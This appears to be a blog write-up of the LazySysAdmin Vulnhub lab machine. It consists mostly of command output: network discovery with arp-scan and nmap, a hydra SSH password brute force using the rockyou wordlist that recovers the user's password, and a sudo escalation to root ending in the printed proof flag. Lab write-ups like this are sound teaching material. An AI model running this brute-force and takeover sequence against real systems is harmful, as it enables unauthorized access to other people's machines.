---
layout: post
title: LazySysAdmin - Vulnhub
date: 2025-04-23
categories: vulnhub

---



```sh
 sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: bc:24:11:be:8e:8e, IPv4: 192.168.2.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.2.1	24:bb:c9:19:98:a5	(Unknown)
192.168.2.2	48:2a:e3:2c:0c:31	Wistron InfoComm(Kunshan)Co.,Ltd.
192.168.2.10	f8:bc:12:7f:7b:5a	Dell Inc.
192.168.2.20	bc:24:11:e9:c4:98	(Unknown)
192.168.2.166	08:00:27:d9:3a:98	PCS Systemtechnik GmbH

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.124 seconds (120.53 hosts/sec). 5 responded

```


##### Nmap scan

```sh
nmap -p- -sV lazy.lan 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 14:15 SAST
Nmap scan report for lazy.lan (192.168.2.166)
Host is up (0.00023s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
MAC Address: 08:00:27:D9:3A:98 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds

```


```sh
hydra -l togie -P /usr/share/wordlists/rockyou.txt ssh://lazy.lan  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-02 14:40:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://lazy.lan:22/
[22][ssh] host: lazy.lan   login: togie   password: 12345
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-02 14:40:24

```



#### PrivEsc

```sh
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie: 
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:~$ ls
togie@LazySysAdmin:~$ sudo su
root@LazySysAdmin:/home/togie# ls
root@LazySysAdmin:/home/togie# cd /root
root@LazySysAdmin:~# ls
proof.txt
root@LazySysAdmin:~# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu

```
